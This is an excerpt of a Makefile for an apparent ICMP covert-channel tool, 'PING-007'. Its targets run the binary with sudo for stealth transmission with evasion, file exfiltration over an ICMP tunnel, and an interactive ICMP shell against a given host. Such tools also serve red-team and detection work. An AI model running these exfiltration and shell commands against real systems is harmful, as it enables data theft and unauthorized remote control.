...
basic: build ## Basic ICMP transmission (requires TARGET and DATA)
	@echo "$(CYAN)Basic ICMP Operation$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make basic TARGET=192.168.1.100 DATA='test message'$(RESET)"; \
		exit 1; \
	fi; \
	sudo $(BUILD_DIR)/$(BINARY_NAME) basic --target $(TARGET) --data "$(if $(DATA),$(DATA),Hello from PING-007)"

stealth: build ## Stealth transmission with evasion (requires TARGET)
	@echo "$(CYAN) Stealth Operation$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make stealth TARGET=192.168.1.100 DATA='covert message'$(RESET)"; \
		exit 1; \
	fi; \
	sudo $(BUILD_DIR)/$(BINARY_NAME) stealth --target $(TARGET) --data "$(if $(DATA),$(DATA),Stealth message from PING-007)"

exfil: build ## Data exfiltration (requires TARGET and FILE)
	@echo "$(CYAN)📤 Data Exfiltration$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make exfil TARGET=192.168.1.100 FILE=data.txt [METHOD=icmp_tunnel] [MODE=stealth]$(RESET)"; \
		exit 1; \
	fi; \
	if [ -z "$(FILE)" ]; then \
		echo "$(RED) FILE required. Usage: make exfil TARGET=192.168.1.100 FILE=data.txt [METHOD=icmp_tunnel] [MODE=stealth]$(RESET)"; \
		exit 1; \
	fi; \
...
shell: build ## Interactive ICMP shell (requires TARGET)
	...
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make shell TARGET=192.168.1.100 [MODE=interactive]$(RESET)"; \
		exit 1; \
	fi; \
	sudo $(BUILD_DIR)/$(BINARY_NAME) shell --target $(TARGET) --mode $(if $(MODE),$(MODE),interactive)

listen: build ## Data listener mode
	@echo "$(CYAN)👂 Listener Mode$(RESET)"
...
examples: ## Show usage examples
	...
	@echo "  $(GREEN)make basic TARGET=192.168.1.100$(RESET) # Basic ICMP test"
	@echo "  $(GREEN)make basic TARGET=10.0.1.50 DATA='test message'$(RESET)"
	@echo ""
